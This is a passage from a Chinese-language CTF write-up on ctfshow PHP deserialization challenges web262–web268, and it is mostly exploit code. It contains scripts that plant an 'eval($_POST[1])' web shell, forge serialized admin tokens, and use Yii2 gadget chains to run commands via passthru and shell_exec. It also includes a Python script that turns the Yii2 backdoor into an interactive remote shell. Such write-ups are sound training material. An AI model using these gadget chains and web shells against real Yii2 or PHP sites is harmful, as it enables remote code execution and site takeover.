class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;&lt;?php eval($_POST[1])?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  不同的session的序列化引擎会有不同的结果, 利用解析不同造成反序列化漏洞</span></span><br><span class="line"><span class="comment">  user|0:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:24:&quot;&lt;?php eval($_POST[1]); ?&gt;&quot;;s:6:&quot;status&quot;;N;</span></span><br><span class="line"><span class="comment">  a:1:&#123;s:4:&quot;user&quot;;0:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;1.php&quot;;s:8:&quot;password&quot;;s:24:&quot;&lt;?php eval($_POST[1]); ?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;|&#x27;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里不能用hackbar改Cookie, 你得直接在Application里面更改, 好像发包有setcookie</p></blockquote><p>写入cookie后发包, 然后访问<code>check.php</code>, 记得带上两个变量:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check.php?u=123&amp;pass=123</span><br></pre></td></tr></table></figure><p>访问<code>log-1.php</code>即可执行命令, 没成功就多重试几次</p><h2 id="web264"><a class="header-anchor" href="#web264">¶</a>web264</h2><ul><li>提示: message.php</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// # 就拿有用的了</span></span><br></pre></td></tr></table></figure><p><code>message.php</code>如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写入session是在替换后的, 似乎还可以用反序列化字符串逃逸, 基本和web262相同:</p><p>exp如下, payload就是message第三个参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="variable">$msg</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><p>访问<code>message,php</code>, 注意源码要求cookie存在msg参数, 随便填写一个就行</p><blockquote><p>不要用hackbar传cookie, 会报错, 还是在控制台改</p></blockquote><h2 id="web265"><a class="header-anchor" href="#web265">¶</a>web265</h2><ul><li>描述: 无</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考的类似C的指针, 按照地址传参, 简单来说就是将把<code>&amp;a</code>指向的地址传给了<code>&amp;b</code>, a如果发生改变, b也随之变化</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240824202717288.png" alt="image-20240824202717288"></p><p>所以exp如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D</span></span><br></pre></td></tr></table></figure><p>传入即可</p><h2 id="web266"><a class="header-anchor" href="#web266">¶</a>web266</h2><ul><li>描述: 无</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要能传入一个序列化的类就能触发<code>__destruct</code>, 但是被过滤了</p><p>大小写绕过即可, 或者破坏正常的反序列化结构但是保留正常类来得到flag</p><blockquote><p>破坏结构虽然会报错(被正则匹配)但是依然会正常触发<code>__destruct</code></p><p>记得用bp类工具, hackbar我测试不出来</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;Ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;</span><br><span class="line">O:7:&quot;ctfshow&quot;:2:&#123;ctfshow&#125;</span><br></pre></td></tr></table></figure><h2 id="web267"><a class="header-anchor" href="#web267">¶</a>web267</h2><ul><li>描述: 无</li></ul><p>题目只有登录没有注册, 利用Wappalyzer查看中间件, 发现web框架为Yii; 网上一搜就可以搜索到yii2框架有一个反序列化漏洞</p><p>在源码中可以找到yii.js, 发现正好是2.0版本, 现在只需要找到入口即可, <a href="https://blog.csdn.net/byname1/article/details/137093252">利用和解析</a>, <a href="https://blog.csdn.net/cosmoslin/article/details/120612714">其他版本利用和解析</a></p><p>尝试弱密码登录, 发现是admin:admin, 发现about界面换了, 查看源码可以发现新的注释: <code>&lt;!--?view-source --&gt;</code></p><p>访问<code>/index.php?r=site%2Fabout&amp;view-source</code>得到提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///backdoor/shell</span><br><span class="line">unserialize(base64_decode($_GET[&#x27;code&#x27;]))</span><br></pre></td></tr></table></figure><p>访问<code>/index.php?r=backdoor/shell</code>, 提示没有code参数, 尝试传参<code>&amp;code=1</code>, 返回空白, 这里肯定有界面, 那么界面有了, 开始利用反序列化链;</p><p>flag在根目录下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;tac /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET:</span><br><span class="line">/index.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure><p>再给一个大佬给的python脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">command: <span class="built_in">str</span>, arg: <span class="built_in">str</span></span>):</span><br><span class="line">    url = <span class="string">&quot;http://b491d895-d559-480c-9452-755528e4a4d7.challenge.ctf.show/&quot;</span>  <span class="comment"># 以/结尾</span></span><br><span class="line">    payload = <span class="string">b&#x27;O:32:&quot;Codeception\\Extension\\RunProcess&quot;:1:&#123;s:43:&quot;\x00Codeception\\Extension\\RunProcess\x00processes&quot;;a:1:&#123;i:0;O:20:&quot;Faker\\ValidGenerator&quot;:3:&#123;s:12:&quot;\x00*\x00generator&quot;;O:22:&quot;Faker\\DefaultGenerator&quot;:1:&#123;s:10:&quot;\x00*\x00default&quot;;s:arg_l:&quot;arg&quot;;&#125;s:12:&quot;\x00*\x00validator&quot;;s:function_l:&quot;function&quot;;s:13:&quot;\x00*\x00maxRetries&quot;;i:1;&#125;&#125;&#125;&#x27;</span></span><br><span class="line">    payload = payload.replace(<span class="string">b&quot;function_l&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(command)).encode())</span><br><span class="line">    payload = payload.replace(<span class="string">b&quot;function&quot;</span>, command.encode())</span><br><span class="line">    </span><br><span class="line">    payload = payload.replace(<span class="string">b&quot;arg_l&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(arg)).encode())</span><br><span class="line">    payload = payload.replace(<span class="string">b&quot;arg&quot;</span>, arg.encode())</span><br><span class="line">    params = &#123;<span class="string">&quot;r&quot;</span>: <span class="string">&quot;/backdoor/shell&quot;</span>, <span class="string">&quot;code&quot;</span>: base64.b64encode(payload).decode()&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.get(url+<span class="string">&quot;index.php&quot;</span>, params=params)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.get(url+<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请输入命令...&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = <span class="string">&quot;shell_exec&quot;</span></span><br><span class="line">        arg = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> arg == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> arg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        res = <span class="built_in">round</span>(command, arg + <span class="string">&quot; | tee 1&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res[:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>还可以写shell:</p><blockquote><p>所有的命令回显其实都可以DNS外带, 以后再来探索吧</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27; &gt; /var/www/html/basic/web/1.php&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web268"><a class="header-anchor" href="#web268">¶</a>web268</h2><ul><li>描述: 换个姿势</li></ul><p>换个链子就可以继续了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">web</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\<span class="title function_ invoke__">IndexAction</span>(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span> &#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">base</span>\<span class="title class_">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\<span class="title function_ invoke__">DbSession</span>(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">exp</span> = <span class="title class_">new</span> \<span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>(&#x27;<span class="title class_">shell_exec</span>&#x27;, &quot;<span class="title class_">echo</span> &#x27;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_POST</span>[1]);<span class="meta">?&gt;</span><span class="string">&#x27; &gt; /var/www/html/basic/web/1.php&quot;); 